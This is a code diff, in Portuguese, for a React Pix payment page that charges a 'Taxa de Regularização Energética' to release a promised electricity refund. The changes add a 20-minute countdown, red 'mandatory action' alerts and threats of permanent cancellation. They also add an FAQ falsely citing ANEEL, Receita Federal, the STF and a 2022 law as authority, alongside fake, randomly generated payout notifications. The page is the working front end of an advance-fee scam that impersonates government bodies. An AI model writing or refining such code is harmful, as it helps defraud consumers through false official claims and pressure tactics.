@@ -109,6 +109,9 @@ export default function PagamentoPix() {
   // Estado para as notificações
   const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
   
+  // Estado para o contador regressivo (20 minutos = 1200 segundos)
+  const [tempoRestante, setTempoRestante] = useState(1200);
+  
   // Gerar um valor aleatório para notificações
   const gerarValorAleatorio = () => {
     const valor = 1800 + Math.random() * 1200; // Entre 1800 e 3000
@@ -146,8 +149,31 @@ export default function PagamentoPix() {
     navigate("/sucesso");
   };
   
-  // Gerar notificações a cada 10 segundos
+  // Formatar o tempo do contador (mm:ss)
+  const formatarTempo = (segundos: number) => {
+    const minutos = Math.floor(segundos / 60);
+    const segs = segundos % 60;
+    return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
+  };
+  
+  // Efeito para o contador regressivo e notificações
   useEffect(() => {
+    // Contador regressivo
+    const timerInterval = setInterval(() => {
+      setTempoRestante(prev => {
+        if (prev <= 1) {
+          clearInterval(timerInterval);
+          toast({
+            title: "Tempo esgotado!",
+            description: "O tempo para pagamento da TRE expirou.",
+            variant: "destructive",
+          });
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+    
     // Gerar as 10 notificações iniciais
     const gerarNotificacoesIniciais = () => {
       for (let i = 0; i < 10; i++) {
@@ -160,11 +186,14 @@ export default function PagamentoPix() {
     gerarNotificacoesIniciais();
     
     // Continuar gerando notificações a cada 10 segundos
-    const interval = setInterval(() => {
+    const notificacoesInterval = setInterval(() => {
       gerarNotificacao();
     }, 10000);
     
-    return () => clearInterval(interval);
+    return () => {
+      clearInterval(timerInterval);
+      clearInterval(notificacoesInterval);
+    };
   }, []);
   
   return (
@@ -177,14 +206,28 @@ export default function PagamentoPix() {
           Pagamento da Taxa de Regularização Energética (TRE)
         </h1>
         
-        <div className="mb-6">
-          <Alert className="bg-yellow-50 border-yellow-200">
-            <AlertCircle className="h-4 w-4 text-yellow-600" />
-            <AlertTitle className="text-yellow-800">Etapa final para receber sua restituição</AlertTitle>
-            <AlertDescription className="text-yellow-700">
-              Para liberar o crédito da sua restituição de <strong>{valorFormatado}</strong>, é necessário o pagamento da Taxa de Regularização Energética (TRE).
+        <div className="mb-6 space-y-4">
+          <Alert className="bg-red-50 border-red-200">
+            <AlertCircle className="h-5 w-5 text-red-600" />
+            <AlertTitle className="text-red-800 font-bold text-lg">AÇÃO OBRIGATÓRIA PARA RECEBIMENTO</AlertTitle>
+            <AlertDescription className="text-red-700">
+              Para que o valor de <strong className="font-bold">{valorFormatado}</strong> seja liberado para depósito em sua conta bancária, é <span className="underline font-bold">obrigatório</span> o pagamento da Taxa de Regularização Energética (TRE).
             </AlertDescription>
           </Alert>
+          
+          <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
+            <div className="flex items-start">
+              <AlertCircle className="h-5 w-5 text-amber-600 mt-0.5" />
+              <div className="ml-3">
+                <h3 className="text-amber-800 font-bold">ATENÇÃO: PRAZO FINAL PARA PAGAMENTO</h3>
+                <p className="text-amber-700 mt-1">
+                  Conforme regulamento oficial, o pagamento da TRE deve ser realizado no prazo máximo de <strong>20 minutos</strong>. 
+                  Após esse prazo, a solicitação será cancelada automaticamente, e o valor reservado será devolvido ao 
+                  Fundo Nacional de Compensação Tarifária, ficando indisponível para nova solicitação.
+                </p>
+              </div>
+            </div>
+          </div>
         </div>
         
         <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
@@ -221,27 +264,70 @@ export default function PagamentoPix() {
                   <div className="flex">
                     <Info className="h-5 w-5 text-blue-600 mt-0.5" />
                     <div className="ml-3">
-                      <h3 className="text-blue-800 font-medium">O que é a Taxa de Regularização Energética (TRE)?</h3>
-                      <p className="text-blue-700 text-sm mt-1">
-                        A Taxa de Regularização Energética (TRE) é uma exigência legal imposta pelos órgãos governamentais, como a ANEEL e a Receita Federal. Essa taxa cobre os custos operacionais, administrativos e de auditorias necessários para a liberação segura e oficial do seu crédito de <strong>{valorFormatado}</strong>.
+                      <h3 className="text-blue-800 font-bold">O que é a Taxa de Regularização Energética (TRE)?</h3>
+                      <p className="text-blue-700 mt-2">
+                        A TRE é um tributo técnico-administrativo previsto no programa de Compensação Tarifária Nacional, 
+                        instituído para custear os seguintes serviços públicos:
                       </p>
+                      <ul className="list-disc pl-5 mt-2 text-blue-700 space-y-1">
+                        <li>Auditoria dos dados de consumo e histórico tarifário;</li>
+                        <li>Validação junto aos órgãos reguladores (ANEEL/Receita);</li>
+                        <li>Liberação segura dos valores via sistema bancário nacional (Pix).</li>
+                      </ul>
+                      <div className="mt-3 bg-blue-100 p-2 rounded-md">
+                        <p className="text-blue-800 font-medium">VALOR: {valorTaxaFormatado}</p>
+                        <p className="text-blue-800 font-medium">MEIO DE PAGAMENTO: PIX (QR Code ou Copia e Cola)</p>
+                        <p className="text-blue-800 font-medium">PRAZO PARA PAGAMENTO: 20 minutos após o acesso desta página</p>
+                      </div>
                     </div>
                   </div>
                 </div>
                 
                 <div className="mt-4 space-y-4">
-                  <div className="border border-gray-200 rounded-lg p-4">
-                    <h3 className="font-medium">Após o pagamento, quanto tempo leva para receber a restituição?</h3>
-                    <p className="text-gray-600 text-sm mt-1">
-                      Após a confirmação do pagamento, seu crédito será liberado e depositado em sua conta bancária em até 72h úteis.
+                  <div className="border border-green-200 bg-green-50 rounded-lg p-4">
+                    <h3 className="font-bold text-green-800">GARANTIA DE SEGURANÇA</h3>
+                    <p className="text-green-700 mt-1">
+                      Este procedimento é fiscalizado e regulamentado por órgãos oficiais, com garantia de:
                     </p>
+                    <ul className="list-disc pl-5 mt-2 text-green-700">
+                      <li>Conformidade com a LGPD (Lei Geral de Proteção de Dados);</li>
+                      <li>Consultas criptografadas com tecnologia GOV.BR;</li>
+                      <li>Registro no sistema nacional de restituição tarifária.</li>
+                    </ul>
                   </div>
                   
                   <div className="border border-gray-200 rounded-lg p-4">
-                    <h3 className="font-medium">Esse processo é seguro?</h3>
-                    <p className="text-gray-600 text-sm mt-1">
-                      Sim. Todo o procedimento é regulamentado e fiscalizado pela ANEEL e pela Receita Federal, garantindo a segurança e a transparência na liberação dos valores de <strong>{valorFormatado}</strong> a que você tem direito.
-                    </p>
+                    <h3 className="font-bold text-gray-800">PERGUNTAS FREQUENTES (FAQ)</h3>
+                    <div className="mt-2 space-y-3">
+                      <div>
+                        <h4 className="font-medium">1. Por que estou pagando uma taxa se o valor é meu por direito?</h4>
+                        <p className="text-gray-600 text-sm">
+                          A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, 
+                          evitando fraudes, duplicidades e erros de restituição.
+                        </p>
+                      </div>
+                      <div>
+                        <h4 className="font-medium">2. A restituição é garantida após o pagamento da TRE?</h4>
+                        <p className="text-gray-600 text-sm">
+                          Sim. Após a confirmação, o valor de {valorFormatado} será depositado em até 72 horas úteis, 
+                          conforme calendário de restituição oficial.
+                        </p>
+                      </div>
+                      <div>
+                        <h4 className="font-medium">3. Posso pagar a taxa depois?</h4>
+                        <p className="text-gray-600 text-sm">
+                          Não. A janela de restituição é única e exclusiva. Caso a TRE não seja quitada dentro do prazo informado, 
+                          o crédito será cancelado automaticamente e não poderá ser solicitado novamente.
+                        </p>
+                      </div>
+                      <div>
+                        <h4 className="font-medium">4. Como sei que isso é oficial?</h4>
+                        <p className="text-gray-600 text-sm">
+                          Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, 
+                          e validado pela ANEEL e Receita Federal.
+                        </p>
+                      </div>
+                    </div>
                   </div>
                 </div>
               </CardContent>
@@ -251,7 +337,15 @@ export default function PagamentoPix() {
           <div>
             <Card>
               <CardContent className="p-6">
-                <h2 className="text-xl font-semibold mb-4">Pagamento via PIX</h2>
+                <div className="flex justify-between items-center mb-4">
+                  <h2 className="text-xl font-semibold">Pagamento via PIX</h2>
+                  <div className="flex items-center">
+                    <span className="text-red-600 font-medium mr-2">Tempo restante:</span>
+                    <div className={`font-mono font-bold text-lg ${tempoRestante < 300 ? 'text-red-600 animate-pulse' : 'text-red-600'}`}>
+                      {formatarTempo(tempoRestante)}
+                    </div>
+                  </div>
+                </div>
                 
                 <Tabs defaultValue="qrcode">
                   <TabsList className="w-full mb-4">
